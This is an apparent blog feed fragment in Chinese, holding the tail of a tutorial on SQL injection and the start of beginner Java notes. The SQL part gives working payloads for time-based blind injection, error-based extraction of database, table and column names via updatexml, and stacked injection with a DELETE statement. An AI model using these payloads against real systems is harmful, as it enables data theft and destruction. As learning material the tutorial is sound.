class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">if</span><span class="hljs-params">(condition,value_if_true,value_if_false)</span>;<br><br><span class="hljs-string">//</span> <span class="hljs-literal">true</span>:条件成立时要返回的值<br><span class="hljs-string">//</span> <span class="hljs-literal">false</span>:条件不成立时要返回的值<br></code></pre></td></tr></table></figure><h3 id="SLEEP-函数"><a href="#SLEEP-函数" class="headerlink" title="SLEEP()函数"></a><code>SLEEP()</code>函数</h3><p>程序执行时，会暂停指定秒数</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">sleep(<span class="hljs-number">5</span></span>),1,0)</span>;<br><br><span class="hljs-comment">//如果不存在用户名为 admin 的用户，语句将立即返回结果，否则暂停 5s 再返回结果</span><br></code></pre></td></tr></table></figure><p>延时函数 <code>SLEEP()</code> 或 <code>BENCHMARK()</code> 函数来判断是否注入成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ASCII(substr(username),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br><br>// 如果用户表中的第一个用户名字符为字母 a，则程序会暂停 <span class="hljs-number">5</span>s,否则返回 <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a><code>BENCHMARK()</code>函数</h3><p>用于重复执行指定语句</p><p>（重复执行次数，重复执行语句）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(count,expr)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(benchmark(<span class="hljs-number">10</span>,md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>// 如果数据库中不存在用户名为 <span class="hljs-keyword">admin</span> 的用户，那么该语句将会立即返回；否则，程序将会重复执行 md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>) 函数 <span class="hljs-number">10</span> 次后再返回结果<br></code></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p><strong><code>unix_timestamp()</code> 函数</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">unix_timestamp</span>)&gt;1382772838,<span class="hljs-title">sleep</span>(<span class="hljs-params"><span class="hljs-number">5</span></span>),0)</span>;<br><br><span class="hljs-comment">//如果当前时间戳大于 1382772838,则程序会暂停 5s,否则返回 0</span><br></code></pre></td></tr></table></figure><h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>利用函数返回值判断是否注入成功</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(username)=<span class="hljs-number">4</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>通过报错获取信息</p><h2 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><code>updatexml()</code>函数</h2><p>用于更新 xml 格式数据</p><p>（要更新的 xml 数据，要更新的节点路径，更新的节点值）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(xml_target,xpath_expr,new_value)</span></span><br></code></pre></td></tr></table></figure><p>这个函数有一个缺陷，如果二个参数包含<strong>特殊符号</strong>时会报错，并且会第二 个参数的内容显示在报错信息中</p><p>比如</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">3</span>);<br><br>会报错：XPATH syntax error: <span class="hljs-string">&#x27;~&#x27;</span><br></code></pre></td></tr></table></figure><p>所以可以用 <code>concat()</code> 函数将查询语句和特殊符号拼接在一起</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~8.0.40&#x27;</span><br></code></pre></td></tr></table></figure><p><code>updatexml()</code>有长度限制，可以用 <code>limit()</code>和<code>substr()</code> 函数</p><p><strong><code>limit()</code> 函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>);<br><br>//可以不断改变 <span class="hljs-keyword">limit</span> num,<span class="hljs-number">1</span> 的值逐行获取<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL15.png"></p><p><strong><code>substr()</code>函数</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~admin,ctf,test,flag,user&#x27;</span><br></code></pre></td></tr></table></figure><p>获得所有数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata), <span class="hljs-number">1</span> , <span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~mysql,information_schema,perfor&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>//XPATH syntax error: <span class="hljs-string">&#x27;~columns_priv,component,db,defau&#x27;</span><br></code></pre></td></tr></table></figure><p>获取所有字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;db&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>); <br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~Host,Db,User,Select_priv,Insert&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="EXTRACTVALUE-函数"><a href="#EXTRACTVALUE-函数" class="headerlink" title="EXTRACTVALUE()函数"></a><code>EXTRACTVALUE()</code>函数</h2><p>从 XML 格式的数据中提取指定节点的值</p><p>（要提取节点值的 XML 数据，要提取的节点路径）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">(xml_target,xpath_expr)</span></span><br></code></pre></td></tr></table></figure><p>报错和 <code>updatexml()</code> 函数一样，使用也差不多，但是少一个参数 x</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p> 一堆 SQL 语句 (多条) 一起执行方法</p><p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击（感觉有点小像爆破）。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>堆叠注入可以执行的是<strong>任意</strong>的语句。</p><p>比如用户输入：1; DELETE FROM products </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> productid=<span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><p>并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><p>只是一些常见的注入类型，以后在学习过程中还会遇到新知识，到时候再补充嘻嘻~~~</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>SQL 注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 基础</title>
    <link href="/2024/11/09/Java/"/>
    <url>/2024/11/09/Java/</url>
    
    <content type="html"><![CDATA[<p>一些学习 Java 的笔记，篇幅有点长嘻嘻 ^__^ ~</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h2><h6 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h6><p>​1.整数类型（byte,short,int,long）</p><p>​2.浮点类型（float,double）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span><span class="hljs-number">30L</span>;<span class="hljs-comment">// long 型加 L</span><br><span class="hljs-type">float</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">50.1F</span>;<span class="hljs-comment">// float 型加 F</span><br></code></pre></td></tr></table></figure><h6 id="字符型（char）2个字节"><a href="#字符型（char）2个字节" class="headerlink" title="字符型（char）2个字节"></a>字符型（char）2个字节</h6><h6 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h6><h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><p>类（class） </p><p>接口（interface）</p><p>数组（[]）</p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>＋-作为单元运算符存在时，表示正负</p><p>1.＋</p><p>＋左右两边没有字符串，则进行数值运算。</p><p>＋左右两边有字符串，进行字符串拼接，如果不是字符串会<strong>转换成字符串</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">100</span>+<span class="hljs-number">98</span>);<span class="hljs-comment">//198</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-number">1</span>+<span class="hljs-number">3</span>);<span class="hljs-comment">//a13</span><br>System.out.println(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>+<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-comment">//4a</span><br></code></pre></td></tr></table></figure><p>2.%</p><p><strong>a%b=&#x3D;a-a&#x2F;b*b</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);          <span class="hljs-comment">//-2</span><br>System.out.println(<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//-2 </span><br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>&amp; 和|不管真假都运算</p><p>HEX编码</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h3><p>​元素类型[ ]  数组名&#x3D; new 元素类型[数组长度]；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span>  <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><h3 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h3><p>元素类型[ ]  数组名&#x3D;new 元素类型[ ]{元素，元素，元素…};</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[]  arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[ ]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] arr=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><p>相当于 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,arr[<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>,arr[<span class="hljs-number">2</span>]=<span class="hljs-number">3</span>,arr[<span class="hljs-number">3</span>]=<span class="hljs-number">4</span>,arr[<span class="hljs-number">4</span>]=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>e.g</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span>[] chars=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br><span class="hljs-type">char</span> chars1[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="数组创建后没有赋值就是默认值"><a href="#数组创建后没有赋值就是默认值" class="headerlink" title="数组创建后没有赋值就是默认值"></a>数组创建后没有赋值就是默认值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span>/<span class="hljs-type">int</span>/<span class="hljs-type">short</span>/<span class="hljs-type">byte</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">float</span>/<span class="hljs-type">double</span> <span class="hljs-number">0.0</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-literal">false</span><br><br>String <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h3 id="数组使用步骤"><a href="#数组使用步骤" class="headerlink" title="数组使用步骤"></a>数组使用步骤</h3><p>声明数组-&gt;开辟空间-&gt;给数组各个元素赋值-&gt;使用数组</p><h3 id="数组成员的赋值和读取"><a href="#数组成员的赋值和读取" class="headerlink" title="数组成员的赋值和读取"></a>数组成员的赋值和读取</h3><h3 id="下标越界会抛异常"><a href="#下标越界会抛异常" class="headerlink" title="下标越界会抛异常"></a>下标越界会抛异常</h3><p><strong>数组下标越界异常</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] arr=new int[<span class="hljs-number">3</span>];<br><span class="hljs-attribute">System</span>.out.println(arr[<span class="hljs-number">3</span>]);//有效下标为<span class="hljs-number">0</span>，<span class="hljs-number">1</span>，<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>空指针异常</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int[] arr<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><p><strong>数组名.length</strong>获取数组长度</p><p>数组扩容</p><h3 id="值传递与引用传递"><a href="#值传递与引用传递" class="headerlink" title="值传递与引用传递"></a>值传递与引用传递</h3><h4 id="a-栈内存"><a href="#a-栈内存" class="headerlink" title="a.栈内存"></a>a.栈内存</h4><p>​存储局部变量，离开作用域，自动释放</p><h4 id="b-堆内存"><a href="#b-堆内存" class="headerlink" title="b.堆内存"></a>b.堆内存</h4><p>​数组和对象，通过 new 建立的实例都放在堆内存中</p><p>​当没有任何引用指向实例的时候，gc 会不定时回收</p><p>​实例中的变量都有默认初始化值，建议手动初始化</p><p>​引用类型的初始化为 null</p><h4 id="c-方法区、本地方法区"><a href="#c-方法区、本地方法区" class="headerlink" title="c.方法区、本地方法区"></a>c.方法区、本地方法区</h4><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="二维数组定义和长度"><a href="#二维数组定义和长度" class="headerlink" title="二维数组定义和长度"></a>二维数组定义和长度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>&#123;<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span>&#125;，<br>&#123;<span class="hljs-number">4</span>，<span class="hljs-number">5</span>，<span class="hljs-number">6</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br>arr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>System.out.println(arr.length); <span class="hljs-comment">//2，二维数组长度</span><br>System.out.println(arr[<span class="hljs-number">0</span>].length);<br>System.out.println(arr[<span class="hljs-number">1</span>].length);<span class="hljs-comment">//3，个数</span><br><br><br><br>&#123;<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,<br>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;<br>&#125;<br><span class="hljs-type">int</span>[][] arr2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][];<span class="hljs-comment">//先开辟空间，2行，再继续取列数</span><br>arr2[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>];<br>arr2[<span class="hljs-number">1</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><br><br><br><span class="hljs-type">int</span>[][] arr3=&#123;<br>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,<br>&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二维数组其他定义方式"><a href="#二维数组其他定义方式" class="headerlink" title="二维数组其他定义方式"></a>二维数组其他定义方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x;<span class="hljs-type">int</span> x[];<br><span class="hljs-type">int</span>[][] y;<span class="hljs-type">int</span> y[][];<span class="hljs-type">int</span> [] y[];<br></code></pre></td></tr></table></figure><p>e.g.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span><br>String foo=<span class="hljs-string">&quot;blue&quot;</span>;<br>        <span class="hljs-type">boolean</span>[] bar=<span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(bar[<span class="hljs-number">0</span>])&#123;<br>            foo=<span class="hljs-string">&quot;green&quot;</span>;<br>        &#125;<br>        System.out.println(foo);<br><span class="hljs-comment">//输出blue</span><br><span class="hljs-number">2.</span><br><span class="hljs-type">char</span>[] arr1 = &#123;<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>        <span class="hljs-type">char</span>[] arr2 = arr1;<br>        arr2[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;x&#x27;</span>;<br>        System.out.println(arr1[<span class="hljs-number">2</span>]);<br><span class="hljs-comment">//输出x</span><br><span class="hljs-number">3.</span><br>随机生成十个整数<br><span class="hljs-type">int</span>[] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            arr[i]=(<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br>            System.out.println(arr[i]);<br>        &#125;<br><span class="hljs-comment">//倒序打印</span><br>        <span 